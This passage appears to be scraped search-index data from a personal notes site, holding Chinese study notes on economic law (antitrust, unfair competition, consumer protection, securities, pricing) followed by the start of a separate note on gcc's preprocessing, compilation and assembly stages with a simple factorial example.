自由市场放任→无为之手。20世纪30年代以前，政府职能理论受亚当·斯密的古典经济自由主义理论的支配，普遍推崇自由放任的经济政策。 政府公权力开始干预→扶持之手。以福利经济学为理论基础，政府作为监管者为公共利益而干预经济，充当市场的“裁判员”，比如实施宏观调控、进行经济调节和经济监管。 政府公权力全面干预→掠夺之手。政府作为市场的“参与者”，以普通市场主体的身份参与市场竞争来实现其经济职能。   政府经济职能：政府行为对经济运行产生的各种影响的总称。  分类：政府作为(1)社会管理者; (2)宏观经济调控者; (3)国有资产所有者 所具有的职能。 职能主体的特征：(1)概念外延的狭义性; (2)所涉事务的经济性; (3)主体身份的双重性; (4)权能与范围相对应。    第2节 政府的市场监管者角色 #   管理与监督的区别  理念不同。“管理者”主观上有强烈的控制或管制相对方的欲望或意愿。 方式不同。管理习惯用直接、强行性的行政手段实施经济监管职能；监督则愿意使用间接、偏自律的法治手段形式经济管理职权 路径不同。管理采用自上而下的治理机制，监管采用自下而上、先立规矩再有实践。   经济监管权特征：来源法定性，内容专属性，权责非处分性（不得抛弃让渡），市场约束性（以不破坏市场机制的正常发挥为前提）。 经济监管权内容：  宏观调控权：中央经济监管机关和省级经济监管机关，对国民经济和社会发展目标的决策权力，以及在国民经济与社会发展计划的实施过程中，采用各种手段从宏观上对国民经济实施调节的权力。 市场管理权：指国家监管机关依法对市场活动主体的市场经营行为享有许可、审批、决定等职权。 经济监督权：指有关国家机关对国民经济活动进行监察督导的权力。  具体的包括有国家的计划监督、财政监督、审计监督、会计监督、银行监督等。     经济监管权的实施办法：  准入监管：又称市场准入监管，是指其他市场如要进入市场主体进行经济活动或参与竞争，必须先得到政府市场主体的核准或许可，否则就不享有合法的市场主体以及其运营资格。 退出监管：又称市场退出监管，是指政府主体通过制定规则、执行法令和司法救济等方式强制性令其他市场主体停止某些经济活动或退出某些市场领域监管措施或行为。  常用手段：禁止、命令、处罚   运营监管：  价格费率监管：又称市场运行价格和费率监管，是政府进行市场干预的最重要的形式和最直接的手段，是指对获批进入市场的活动主体 所生产的商品和提供的服务 的价格水平和价格结构进行的监督与管理。 标准控制监管：指政府监管主体价格机制运用经济学 对产品结构、规格、技术、质量和检验方法等标准所作的规定及监管行为。  产品标准：对产品本身的特性提出的要求；技术标准：对生产程序或过程提出的要求。   信息披露监管：是指政府监管主体运用经济学之信息不对称导致价格机制扭曲和市场利益相关者权益常被侵害的理论，依据公开、公平和公正的原则，要求其他市场主体对其产品、服务和经营管理与财务新信息公之于众的监管措施和行为。 激励监管：指政府市场监管主体通过制定相关政策或法律 来鼓励或激励其他市场主体之市场准入、市场运营管理和权益分配等活动的监管行为或措施。     政府监管基本原则：(1)市场优先原则; (2)适度干预原则; (3)依法干预原则; (4)成本收益原则.  第3节 政府的市场参与者角色 #   政府参与市场的途径：  投资融资：政府投资和融资活动是国家或政府参与市场经济活动来达到宏观调控目的的必要手段，有以下两种方式：  国家或政府以财政资金并以特殊方式或载体进行投融资（比如发行主权国家债务） 国家或政府成立、组织或委托企业形态或非企业形态的经济实体进行投融资的活动（比如中石油等大型国有独资或控股企业的投融资行为）   经管企业：作为市场主体的政府亲自参与特殊企业或竞争性企业的经营与管理行为的简称。 专营贸易：政府作为市场主体利用其特殊身份及职权，专门或垄断从事买卖或交易行为。 经营城市：城市政府运用市场机制进行经营活动，以此来调控城市发展目标与有限   政府参与市场的原则：(1)参与目的的公正性; (2)参与范围的有限性; (3)主体身份的平等性; (4)参与方式的公开性。 尽管洛克指出政府的产生是基于公民权的让渡，因而政府天生就应该关注人类整体利益。但现代经济学家认为政府最大化追求自己利益也是政府的基本属性。自利性和公共性的同时存在，会发生政府“经济人”有限理性问题：  政府“经济人”有限理性表现之一：政府与民争利：对社会资本的投资产生挤出效应，因而政府从中获得高额财政收入和垄断利润。 政府“经济人”有限理性表现之二：破坏市场竞争：政府自利性极容易破坏市场竞争并扰乱市场秩序。 政府“经济人”有限理性表现之三：权力寻租严重：政府官员自利性或政府利益集团的自肥行为。 政府“经济人”有限理性表现之四：职能部门矛盾：政府职能部门在充当公共利益代表者的同时，作为单位、部门利益代表者的角色也不断显露。   政府参与市场问题的解决：  避免双重角色错位：监管功能和经济功能分置以及私权利与公权力边界清晰是法律制度构建的重点。 有所为与有所不为：处理好或定位清楚政府公权力私化后的权利边界。 营利性与非营利性。    第六章 行业协会法 #  第1节 行业协会法概述 #   行业协会：是指为了达到共同利益目标组织起来的由会员参与的 一种非营利性的非政府性的自律性的 社会组织。  我国目前尚无《行业协会法》或者类似的法律，主要根据《社会团体登记管理条例》等法律。   行业协会的特点：(1)非营利性; (2)非政府性; (3)中介性; (4)互益性。  中介性：行业协会介于政府和市场主体之间，在沟通政府与企业关系上起着承上启下的桥梁和纽带作用。 互益性：相对公益性而言的概念。互益性组织是由有着共同身份地位、利益需求以及爱好志趣的群体组成的团体，具有封闭性，以其成员利益为追求目标。    第2节 行业协会的自治权 #   行业协会自治权：行业协会所享有的就本行业共同事务自行治理和自行管理的 对本行业协会成员具有约束力和支配力 的一种权利。 自治权的来源：(1)来源于法律授权; (2)来源于政府委托; (3)来自于会员的让渡。 自治权的主要内容  代表职能。行业协会是行业利益、会员共同利益的代表。 服务职能。行业协会的宗旨是维护行业利益，维护行业内企业利益，为行业服务，为行业内企业服务。主要体现在信息、咨询、职业教育三个方面。 协调职能。是中介性的体现，主要体现在行业协会在政府与企业间的桥梁作用 市场管理职能：(1)行规行约与标准制定权; (2)认证权; (3)许可权; (4)对会员的惩戒权。   行业自律、政府监管与市场的关系  帕累托最优状态(Pareto efficiency)：没有任何人的效用受损，资源分配获得最佳效率。 市场失灵使政府积极干预成为共识。    第3节 行业协会的监管体制 #   对行业协会进行监管的必要性：一切权力都存在被滥用的可能性。 我国目前的行业协会监管特点：  严格准入：设立条件严格并且采用审批制； 双重管理：实行业务主管部门和登记部门双重管理 一业一会：县级以上同一行政区内，不得重复设立业务范围相同或相似的行业协会。    第七章 公司法 #  第八章 企业法 #  第九章 破产法 #  第二编课堂笔记 #  DAY FIVE #   社会中间层：是指独立于政府主体与市场主体。为政府干预市场、市场影响政府和市场主体之间相互联系起中介作用的主体。 企业法律制度：  个人独资企业：亦称作业主制企业 合伙企业：把几个业主叠加在一起。两个或两个以上出资人为了实现一定的经济目的，根据合伙协议，共同出资、合伙经营、共担风险、共享收益，对合伙企业承担无限连带责任的组织。 公司：出资人以其认缴出资额为限承担有限责任。    第十章 反垄断法，法条 #  第2节 我国反垄断法的立法思想与规制原则 #   从我国《反垄断法》第1条的表述可以看出，我国反垄断法追求的是多元化的立法宗旨: 立法宗旨：(1)预防和制止垄断行为，保护竞争; (2)维护消费者合法权益; (3)维护社会公共利益。 垄断行为的认定原则：  原则违法原则：又称当然违法原则。它适用于主观上存在危害市场竞争，并且实际上也往往能产生严重危害市场竞争，损害消费者利益的违法行为。  适用时原告只需证明存在这样的垄断行为，而不需要证明行为的反竞争性。   合理原则：又称合理分析原则。是指经营者行为是否违反垄断法时，需要对影响竞争的各种因素进行分析评价，只有那些不合理地限制了竞争的行为才是反垄断法所禁止的。  如果在经济上带来的有利因素超过限制竞争带来的不利因素，执法部门会认定这个行为是合法的。     适用除外原则：指在某些特定的行业或领域，基于竞争政策以外的其他政策的考虑等原因，允许一定的垄断状态以及垄断行为存在的原则。  适用的范围包括：(1)特定的行业; (2)正当行使知识产权; (3)对特定组织或人员; (4)对外经贸领域。    第3节 我国反垄断法规制的主要内容 #   垄断协议：排除限制竞争的协议、决定或者其他协同行为。  构成形式：协议、决定或协同行为。 以达成垄断协议的主体之间的关系划分：  横向协议：也称卡尔特、水平协议。处于同一交易阶段的经营者即竞争对手之间达成的垄断协议。 纵向协议：也称垂直协议，处于不同交易阶段的经营者即交易对手之间达成的垄断协议。 我国反垄断法只对其中一部分做出了明确的禁止性规定。   横向垄断协议：  固定或变更商品价格：垄断协议中对市场危害最严重的一种形式，也称价格卡特尔。 限制商品的生产数量或者价格销售数量：也称数量卡尔特。 分割销售市场或者原材料采购市场：也称地域卡尔特。 限制购买新技术、新设备或者限制开发新技术、新产品 联合抵制：也称集体拒绝交易、联合拒绝交易。 国务院反垄断执法机构认定的其他垄断协议。   纵向垄断协议：  固定向第三人转售商品的价格 限定向第三人转售商品的最低价格 国务院反垄断执法机构认定的其他垄断协议   认定其他协同行为，应当考虑下列因素（根据《工商行政管理机关禁止垄断协议行为的规定》第3条）：(1)经营者的市场行为是否一致; (2)经营者之间是否进行过意思联络或者信息交流; (3)经营者能否对一致行为做出合理解释。还应当考虑相关市场的结构情况、竞争状况、市场变化情况、行业情况等。   市场支配地位：经营者在相关市场内具有能够控制商品价格、数量或者其他交易条件，或者能够阻碍、影响其他经营者进入相关市场能力的市场地位。  市场支配地位的认定与推定：（根据《反垄断法》第18条的规定）(1)企业的市场份额; (2)相关市场内的竞争状况; (3)经营者对市场的控制能力; (4)经营者的财力和技术条件; (5)其他经营者对该经营者在交易上的依赖程度; (6)其他经营者进入该相关市场的难易程度。 滥用市场支配地位的行为（我国《反垄断法》中列举的六种滥用市场支配地位的行为）  以垄断高价销售或以垄断低价购进 掠夺性定价：持续以低于成本的价格销售商品，以便将对手排挤出市场，或阻止新的竞争者进入市场。 拒绝交易：没有正当理由而拒绝与交易相对人进行交易的行为。 强制交易：没有正当理由，限制交易相对人只能与其进行交易或者只能与其指定的经营者进行交易。 搭售：强迫交易对方购买从性质、交易习惯上均与合同无关的产品或服务，或者符加其他不合理的条件。 差别待遇：也称歧视行为，没有正当理由对条件相同的交易相对人采取不同的交易价格等交易条件，而使有的交易对方处于不利的竞争地位。 其他滥用市场支配地位的行为。     经营者集中：  经营者集中的形式：(1)合并; (2)通过取得股权或者资产取得对其他经营者的控制权; (3)通过合同等方式取得对其他经营者的控制权或者对其他经营者施加决定性影响。 经营者集中的申报：我国采取事先申报的强制性制度。 经营者集中的审查：主要从市场份额、市场集中度、市场进出壁垒、对消费者的影响等方面分析。   行政垄断：我国《反垄断法》除了传统三大经济垄断行为之外，还规定了行政机关的行政垄断行为  行政强制交易行为：行政机关和法律、法规授权的具有管理公共事务职能的组织滥用行政权力，限定或者变相限定单位或个人经营、购买、使用其指定的经营者提供的商品。 地区封锁行为：行政机关和法律、法规授权的具有管理公共事务职能的组织滥用行政权力，阻挠、限制外地与本地的产品、服务、资金等的自由流通行为（地方保护主义）。 强制从事垄断行为：强制经营者从事反垄断法规定的垄断行为。 抽象行政垄断行为。    第十一章 反不正当竞争法，法条 #  第1节 概述 #   不正当竞争：指在工商页活动中违反诚实、公平、平等的商业惯例和公认的商业道德，采取不正当的手段获得交易机会的行为。  我国《反不正当竞争法》第2条第二款：本法所称的不正当竞争，是指经营者违反本法规定，损害其他经营者合法权益，扰乱社会秩序的行为 因而，不正当竞争行为应该具有以下特点：  行为的违法性 行为的主体是经营者：从事商品经营或者营利性服务的法人、其他经济组织和个人。 行为的危害性：行为损害其他经营者合法权益，扰乱社会经济秩序。      第2节 不正当竞争行为 #   假冒行为：  假冒他人注册商标：未经注册商标所有人许可，在同一种商品或类似商品上使用与其注册商标相同或者近似的商标的行为。 假冒、仿冒知名商品特有的名称、包装和装潢 擅自使用他人企业名称或姓名 伪造、冒用质量标志、伪造产地等虚假表示   商业贿赂：指经营者为销售或者购买商品而采用财务或者其他手段贿赂对方单位或者个人的行为。  几个概念：“回扣”，“折扣”，“佣金”，“帐外暗中”，“明示入账”   虚假宣传：经营者利用广告或其他方法对商品或服务做出与实际情况不符的公开宣传，导致或足以导致他人产生错误认识的不正当竞争行为。 侵犯商业秘密：我国《反不正当竞争法》中规定的商业秘密是指：不为公众所知悉，能为权利人带来经济利益，具有实用性并经权利人采取保密措施的技术信息和经营信息。 不正当有奖销售：  有奖销售是指经营者以附带性地提供物品、金钱或其他经济利益的引诱方式，销售其商品或服务的行为。不正当有奖销售包括:   欺骗式有奖销售：谎称有奖、故意让内定人员中奖、操控有奖销售、对有奖销售事项做不当告知。 利用有奖销售推销质次价高的商品 巨额有奖销售（抽奖式有奖销售最高奖不得超过5000元）   商业诋毁：指经营者自己或者利用他人，通过捏造、散布虚伪事实等不正当手段，贬低、诋毁竞争对手的商业信誉、商品声誉，以削弱其市场竞争力的行为。  第3节 不正当竞争行为的监督检查和法律责任 #   监督检查：《反不正当竞争法》第3条第二款规定：县级以上人民政府工商行政管理部门对不正当竞争行为进行监督检查；法律行政法规规定由其他部门监督检查的，依照其规定。  检查部门有以下职权：(1)询问取证权; (2)检查财务等权力。   法律责任：民事责任、行政责任、刑事责任。  第十二章 消费者权益保护法，法条 #  第1节 概述 #   从市场经济的理论上讲：企业的目标是实现利润的最大化，而消费者的目标是实现效用的最大化。 《消费者权益保护法》没有对适用范围做专项规定，而是将其与消费活动的概念合二为一了：  消费范围限于生活消费。  生活消费：人们为了满足物质和文化生活的需要而消费物质产品或者接受劳动服务的行为和过程。   消费主体限于自然人。 消费方式包括购买商品、使用商品和接受服务。    第2节 消费者权利 #   消费者权益是指消费者依法享有的权利以及该权利受到保护时给消费者带来的合法利益。主要有以下九项权利：  安全权：人身安全权；财产安全权。 知情权：了解商品和服务的真实情况的权利；了解相关情况的权利。 选择权。 公平交易权：功能齐备，定价合理，计量准确，交易自愿。 索赔权：也称依法求偿权。 依法结社权。 接受教育权。 受尊重权。 监督权。    第3节 经营者义务 #   主要有法律规定的法定义务，基于合同产生的约定义务两类。 根据《消费者权益保护法》，经营者义务主要包括：  依照法定或者约定提供商品或服务的义务 接受监督义务 保证商品和服务安全义务 提供真实信息义务 标明真实身份义务 出具购货凭证或服务单据义务 品质保障义务 售后服务义务 不得以不正当方式自我免责义务 不得侵犯消费者人身权义务    第十三章 产品质量法 #  第十四章 食品安全法 #  第十五章 房地产法 #  第十六章 建筑法 #  第十八章 证券法，法条 #  第1节 证券与证券法 #   证券的概念  经济学上的证券：一种金融资产，一种信用凭证或者金融工具，是证明证券持有人有权按其所载内容取得收益的书面证明。  依其性质，可以分为三类：证据证券、凭证证券、有价证券。   法学上的证券：仅指有价证券。用以表明特定民事权利，即指标有票面金额，证明持有人有权按期取得一定收入并可自由转让和买卖的所有权或债券凭证。  按其所载内容不同，又可分为三类：货币证券、货物证券、资本证券。   证券法上的证券：仅指有价证券中的资本证券。 证券的种类：(1)股票; (2)债券; (3)基金份额; (4)衍生证券。   证券法（广义）：指调整证券关系以及证券行为的所有法律规范或规则的总称。  证券法调整对象：证券发行、证券交易、证券服务、证券监管、证券司法等法律关系。 证券法的基本原则：  保护中小投资者原则 “三公原则”：公开、公平、公正。 反欺诈原则（Antifraud Doctrine）      第2节 证券市场主体 #   证券交易所：买卖股票、公司债、公债等有价证券的市场。 证券市场中介机构：指为证券的发行与交易提供服务，沟通证券投资人与筹集人之间关系的各类中介服务机构，是证券市场运行的组织系统。  证券公司：俗称券商（securities firms, securities trades） 证券登记结算机构 证券投资咨询机构 证券资信评级机构 其他证券服务机构    第3节 证券发行 #   证券发行：政府、金融机构、工商企业等以募集资金为目的向投资者出售代表一定权利的有价证券的活动。  第十九章 保险业监督管理法 #  第三编课堂笔记 #  DAY SEVEN #   反垄断：是指当一个公司的营销呈现垄断或有垄断趋势的时候，国家政府或国际组织的一种干预手段。 市场的构成：生产商→销售商→消费者 垄断协议：横向协议与纵向协议。 豁免：本应适用反垄断法，但基于某种原因排除适用。  需要证明消费者可以获得垄断协议的利益。 这反映到法律上就是由“结构主义”到“行为主义”的转变。   垄断组织：垄断组织是指在资本主义社会的一个或几个经济部门中居于重要地位的大企业之间的联合。  卡特尔、辛迪加、托拉斯、康采恩是垄断组织的四种主要形式。 卡特尔是最早出现的、也是最简单的垄断组织形式。它是生产同类商品的大企业，通过签订关于产品价格、销售市场、生产规模等协定而建立的垄断组织。 辛迪加是同一生产部门的少数大企业通过签订关于销售商品和采购原料的协定而建立的垄断组织。参加辛迪加的企业，其商品销售、原料购买，都必须由总办事处统一办理。 托拉斯是由若干生产同类商品的大企业或产品有密切联系的大企业互相联合而组成的垄断组织。在托拉斯内，一切有关生产、销售和财务等等业务，均由托拉斯理事会统一处理，而原来的企业主则成为托拉斯的股东。 康采恩是由不同经济部门的许多大企业联合组成的垄断组织。参加康采恩的既有单个的企业，又有其他的垄断组织如辛迪加、托拉斯;既有工业企业，又有商业企业、交通运输企业以及银行和保险公司等。其中最大的银行或企业则是这个庞大复杂组织的核心。      DAY EIGHT #   反垄断法禁止的行为 经营者集中 经营者集中的审查考虑的因素：  参与集中的经营者在相关市场的市场份额以及其对市场的控制力； 相关市场的市场集中度； 经营者集中对市场进入、技术进步的影响； 经营者集中对消费者和其他有关经营者的影响； 经营者集中对国民经济发展的影响； 国务院反垄断执法机构认为的其他因素。    DAY NINE #   市场集中度：对相关市场的结构所做的一种描述，体现相关市场内经营者的集中程度。有两种测定方法：  赫芬达指数（HHI指数）：集中设计相关市场中每个经营者的市场份额平方和； 行业集中度指数（Rn指数）：前n个企业市场份额的和   分析：单边效应分析，协同效应分析。  DAY ELEVEN #   反垄断法与反不正当竞争法的区别？ 前者目的为追求自由竞争、保护竞争秩序；后者反对不正当竞争，前提是市场存在竞争。 前者的主体有依法参与竞争的权力；后者主体则有依法从事正当竞争的义务。 前者行为方法主要以经营者共谋、同谋、合谋控制市场，排除、限制竞争为特点；后者则更加多样。 前者常表现为合同行为；后者则定性为侵权行为。 前者强调国家，行政机关主动干预；后者则侵犯私人利益，主要通过诉讼解决。 前者通常为事前管理，主要运用行政手段，处罚力度大；后者规制的行为通常已经实施或结束后的救济，责任为事后责任。    第二十章 财政法 #  第二十一章 政府采购法 #  第二十二章 中央银行法，法条 #  第1节 中央银行法概述 #   中央银行：依法制定和执行国家货币政策，调控货币流通和信用活动，实施金融监管的特殊金融机构。  中央银行的产生基于以下四点原因：\r1. 满足货币发行的需要\r2. 满足政府融资的需要\r3. 为满足票据清算和充当最后贷款人的需要\r4. 满足金融监管和金融调控的需要\r 中央银行法：关于中央银行的组织和职责的法律规范的总称  第3节 中央银行的法定职责 #   货币政策：  货币政策目标：货币政策目标是中央银行制定和执行政策所要达到的最终目标。 货币政策工具：一般性货币政策工具、选择性货币政策工具、直接货币政策工具。   金融监管  第二十三章 税法 #  第二十四章 价格法，法条 #  第1节 概述 #   价格法：调整价格主体的价格行为以及因价格行为所产生的经济关系的法律规范的总称。  立法目的：发挥价格合理配置资源的作用，稳定市场价格总水平，保护消费者和经营者的合法权益，促进社会主义市场经济健康发展。 价格主体：定价主体、价格监管、价格调控主体。 构成内容：价格行为、价格监管、价格总水平调控、价格违法行为以及其法律责任。    第2节 经营者的价格行为 #   经营者：依法取得经营资格的合法经营者。 经营者定价原则：(1)公平原则; (2)合法原则; (3)城市守信原则。 经营者定价依据：生产经营成本和市场供求状况。 经营者定价权利：  市场调节价的自主定价权。市场调节价：由经营者自主制定，通过市场竞争形成的价格。 政府指导价内的定价权。政府指导价：指依照价格法规定，由政府价格主管部门或其他有关部门，按照定价权限和范围规定基准价及其浮动幅度指导经营者制定的价格。 新产品试销的定价权。 价格侵犯的救济权。   经营者定价义务：(1)制定合理价格义务; (2)健全内部管理制度义务; (3)依法进行价格行为义务; (4)明码标价义务。 经营者的不正当价格行为：  相互串通操纵市场的价格行为 低价倾销行为 哄抬价格行为 价格欺诈行为 价格歧视行为 变相提高或者压低价格行为 谋取暴利行为    第3节 政府价格行为 #   政府的定价行为  政府的定价依据：基本依据是商品和服务的社会平均成本，还有市场供求状况，国民经济与社会发展要求以及社会承受能力，社会承受能力，合理的差价。 定价范围：  事关国计民生的极少数商品价格； 资源稀缺的少数商品价格； 自然垄断经营的商品价格； 重要的公用事业价格； 重要的公益性服务价格。     政府的价格调控行为  重要商品储备制度 价格调节基金制度 价格监测制度 价格干预措施    第二十五章 对外贸易法，法条 #  第1节 对外贸易法概述 #   对外贸易：是指一国或者地区同其他国家或地区间进行货物、技术或服务交换的一种经济活动。 促进对外贸易是当今世界世界经济发展的必然要求。 我国《对外贸易法》的原则：  实行统一的对外经贸制度，维护外贸秩序的原则。 鼓励发展对外贸易，保障对外贸易经营者的合法权益的原则。 平等互利的原则。 互惠对等原则和最惠国、国民待遇原则。    第二十六章 审计法 #  FINAL-REVIEW #   新修改《反不正当竞争法》 《中华人民共和国反不正当竞争法》2018修订相对1993年分析? 关于互联网的不正当竞争条款：  新增法条：  第十二条　经营者利用网络从事生产经营活动，应当遵守本法的各项规定。\r经营者不得利用技术手段，通过影响用户选择或者其他方式，实施下列妨碍、破坏其他经营者合法提供的网络产品或者服务正常运行的行为：\r（一）未经其他经营者同意，在其合法提供的网络产品或者服务中，插入链接、强制进行目标跳转；\r（二）误导、欺骗、强迫用户修改、关闭、卸载其他经营者合法提供的网络产品或者服务；\r（三）恶意对其他经营者合法提供的网络产品或者服务实施不兼容；\r（四）其他妨碍、破坏其他经营者合法提供的网络产品或者服务正常运行的行为。\r- 分析：由于现行法没有关于互联网竞争的规定，有的互联网公司甚至质疑反不正当竞争法在互联网领域的适用。互联网领域内的不正当竞争行为不但对互联网企业造成影响，而且对广大消费者的选择造成干扰，如司法领域已判决的３Ｑ大战等。\r- 国家工商总局竞争执法局副局长桑林说，互联网领域的不正当竞争传播快、影响大、易复制。各级工商机关也陆续接到多起基于互联网技术引发的不正当竞争问题投诉，但因为现行法律无明确规定，不能有效发挥行政执法部门的职能。\r- 参与修订草案的专家、北京大学竞争法中心主任肖江平说，对于互联网领域出现的一些全新的不正当竞争行为，由于现行法没有分则条款，因而法院对同种行为的案件判决结果区别较大。“近10年来，至少有400多个互联网领域不正当竞争案件因为没有分则条款，法官的自由裁量幅度过大，学界颇多争议。”肖江平说。\r- 上海交通大学竞争法律与政策研究中心主任王先林说，根据互联网反不正当竞争的客观需要，修订草案中首次增加了互联网不正当竞争条款。草案规定竞争者不得利用技术手段在互联网领域从事影响用户选择、干扰其他经营者正常经营活动的行为，并具体规定了应予以禁止的行为，将增强行政执法查处互联网不正当竞争行为的作用。\r 细化各类恶意仿冒行为：  93年旧法条：  第五条　经营者不得采用下列不正当手段从事市场交易，损害竞争对手：\r（一）假冒他人的注册商标；\r（二）擅自使用知名商品特有的名称、包装、装潢，或者使用与知名商品近似的名称、包装、装潢，造成和他人的知名商品相混淆，使购买者误认为是该知名商品；\r（三）擅自使用他人的企业名称或者姓名，引人误认为是他人的商品；\r（四）在商品上伪造或者冒用认证标志、名优标志等质量标志，伪造产地，对商品质量作引人误解的虚假表示。\r- 08年新法条：\r第六条　经营者不得实施下列混淆行为，引人误认为是他人商品或者与他人存在特定联系：\r（一）擅自使用与他人有一定影响的商品名称、包装、装潢等相同或者近似的标识；\r（二）擅自使用他人有一定影响的企业名称（包括简称、字号等）、社会组织名称（包括简称等）、姓名（包括笔名、艺名、译名等）；\r（三）擅自使用他人有一定影响的域名主体部分、网站名称、网页等；\r（四）其他足以引人误认为是他人商品或者与他人存在特定联系的混淆行为。\r- 当前，将他人注册商标申请为企业字号等造成市场混淆的不正当竞争行为较为普遍，不仅损害了经营者的合法权益，而且对消费者造成误导和损害。这类案件只能在诉讼中适用基本原则予以处理，行政执法机关无法具体实施。\r- “同仁堂”既是中国北京同仁堂（集团）有限责任公司的字号，也是其商品的主要商标。但是按照现行法律，企业名称是分级注册，一些不法商人为搭“同仁堂”企业名誉和商品声誉的便车，以“同仁堂”等字号经营，往往引起消费者误认是北京同仁堂或者与其有关联。这种情形就属于基于商标、企业字号冲突造成的不正当竞争。\r- 国家工商总局竞争执法局反不正当竞争处处长杜长红表示，修订草案确定了使用在先与公平竞争并重的原则，意在对恶意仿冒行为进行制止和查处。\r- 王先林说，与商标法相衔接，修订草案增加了属于不正当竞争行为的规定。将他人注册商标、未注册驰名商标作为企业名称中的字号使用，涉及笔名、艺名、社会组织名称及其简称、域名主体部分、网站名称、网页以及频道、栏目、节目等的名称标识，不管这些误导公众的行为如何改头换面，今后都有望被认定为不正当竞争。\r- 肖江平说，类似江苏卫视的“非诚勿扰”、浙江卫视的“中国好声音”等电视节目，此前的纠纷，在知识产权侵权和反不正当竞争方面，存在一些争议。修订草案把频道、栏目、节目等名称和标识列入不正当竞争行为标的，有助于规范这些领域的市场竞争行为。\r    "},{"id":196,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/0.%E7%BC%96%E8%AF%91%E5%99%A8%E7%9A%84%E5%B7%A5%E4%BD%9C/","title":"0.编译器的工作","section":"编译原理","content":" 参考网址：\n http://www.ntu.edu.sg/home/ehchua/programming/cpp/gcc_make.html https://linux.die.net/man/1/gcc https://sourceware.org/ml/binutils/2009-08/msg00193.html https://web.stanford.edu/class/cs193d/handouts/make.pdf   编译器的工作 #  编译器的主要流程 #  .img{width: 100%}\r一个现代编译器的主要流程如下：（以 gcc 为例）\n另外，使用以下命令可以查看 gcc 使用的所有命令：\n$ gcc -v example.c 该命令的输出会打印在 stderr 上，若希望在文件中阅读该信息，可以使用以下命令：\n$ gcc -v example.c 2\u0026gt; verbose_gcc.txt 预处理器的工作 #  从维基百科上的定义：预处理器是程序中处理输入数据，产生能用来输入到其他程序的数据的程序。输出被称为输入数据预处理过的形式，常用在之后的程序比如编译器中。C 预处理器是最常见的预处理器。\nC 预处理器 #  C 预处理器不是编译器的组成部分，但是它是编译过程中一个单独的步骤。简言之，C 预处理器只不过是一个文本替换工具而已，它们会指示编译器在实际编译之前完成所需的预处理。\n所有的预处理器命令都是以井号（#）开头。它必须是第一个非空字符，为了增强可读性，预处理器指令应从第一列开始。像我们常用的 define，include 等都是 C 预处理器的预处理指令。\n预定义宏 #  ANSI C 定义了许多宏。在编程中您可以使用这些宏，但是不能直接修改这些预定义的宏。\n   宏 描述     __DATE__ 当前日期，一个以 \u0026quot;MMM DD YYYY\u0026quot; 格式表示的字符常量。   __TIME__ 当前时间，一个以 \u0026quot;HH:MM:SS\u0026quot; 格式表示的字符常量。   __FILE__ 这会包含当前文件名，一个字符串常量。   __LINE__ 这会包含当前行号，一个十进制常量。   __STDC__ 当编译器以 ANSI 标准编译时，则定义为 1。    预处理器运算符 #     运算符 作用     宏延续运算符（\\） 一个宏通常写在一个单行上。但是如果宏太长，一个单行容纳不下，则使用宏延续运算符（\\）。   字符串常量化运算符（#） 在宏定义中，当需要把一个宏的参数转换为字符串常量时，则使用字符串常量化运算符（#）。在宏中使用的该运算符有一个特定的参数或参数列表。   标记粘贴运算符（##） 宏定义内的标记粘贴运算符（##）会合并两个参数。它允许在宏定义中两个独立的标记被合并为一个标记。    gcc 的工作 #  从 Linux gcc manual 上，我们知道 gcc 编译有这样一个选项：-E：\n -E\nStop after the preprocessing stage; do not run the compiler proper. The output is in the form of preprocessed source code, which is sent to the standard output.\n 翻译过来就是，加入 -E 选项之后，gcc 这个编译器会在预编译结束时停下来。我们尝试一下：\n$ cat \u0026lt;\u0026lt; _EOF_ \u0026gt; factor.c #include\u0026lt;stdio.h\u0026gt; main(){ int i, n, f; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); i = 2; f = 1; while (i \u0026lt;= n) { f = f * i; i = i + 1; } printf(\u0026#34;%d\u0026#34;, f); return 0; } _EOF_ $ gcc -E factor.c -o factor.i # 因为当 -o 缺省时，预编译结果会输出在标准输出流，因此也可以使用以下命令： # $ gcc -E factor.c \u0026gt; factor.i #  # 或者可以使用之前提到的 `cpp` 进行预编译 # $ cpp factor.c \u0026gt; factor.i $ cat preprecess_factor | less 这时，我们就可以看到 include 这一行不见了，因为 #include 是一个 C 预处理器的预编译指令，它被预编译，导入了如下的 stdio 的包：\n\u0026hellip;\u0026hellip;\nPostScript：关于 gcc 的 -o 选项缺省的问题：\n If -o is not specified, the default is to put an executable file in a.out, the object file for source.suffix in source.o, its assembler file in source.s, a precompiled header file in source.suffix.gch, and all preprocessed C source on standard output.\n 编译器的工作 #  编译器，即 compiler。从维基百科上的定义，是一种计算机程序，它会将用某种编程语言写成的源代码（原始语言），转换成另一种编程语言（目标语言）。\n在我们研究的范围内，编译器的功能是将 C 语言转化成 汇编语言或机器语言。同理参考 gcc Linux manual：\n -S\nStop after the stage of compilation proper; do not assemble. The output is in the form of an assembler code file for each non-assembler input file specified.\n 这一个选项会让 gcc 在编译之后停止，不进行下一步汇编操作，而输出一个文件。我们尝试一下：\n$ gcc factor.c -S $ cat factor.s .file \u0026#34;factor.c\u0026#34; .def __main; .scl 2; .type 32; .endef .section .rdata,\u0026#34;dr\u0026#34; .LC0: .ascii \u0026#34;%d\\0\u0026#34; .text .globl main .def main; .scl 2; .type 32; .endef .seh_proc main main: pushq %rbp .seh_pushreg %rbp movq %rsp, %rbp .seh_setframe %rbp, 0 subq $48, %rsp .seh_stackalloc 48 .seh_endprologue call __main leaq -12(%rbp), %rax movq %rax, %rdx leaq .LC0(%rip), %rcx call scanf movl $2, -4(%rbp) movl $1, -8(%rbp) jmp .L2 .L3: movl -8(%rbp), %eax imull -4(%rbp), %eax movl %eax, -8(%rbp) addl $1, -4(%rbp) .L2: movl -12(%rbp), %eax cmpl %eax, -4(%rbp) jle .L3 movl -12(%rbp), %eax movl %eax, %edx leaq .LC0(%rip), %rcx call printf addq $48, %rsp popq %rbp ret .seh_endproc .ident \u0026#34;GCC: (GNU) 4.8.3\u0026#34; .def scanf; .scl 2; .type 32; .endef .def printf; .scl 2; .type 32; .endef 我找到这个网址，有对 gcc 编译中间汇编代码结果的详细描述。\n汇编器的工作 #  汇编器（Assembler）是将汇编语言翻译为机器语言的程序。 一般而言，汇编生成的是目标代码，需要经链接器（Linker）生成可执行代码才可以执行。\n -c\nCompile or assemble the source files, but do not link. The linking stage simply is not done. The ultimate output is in the form of an object file for each source file.\n 当使用 gcc 的 -c 选项时，会生成一个未链接的目标文件。我们可以尝试一下：\n$ gcc -c 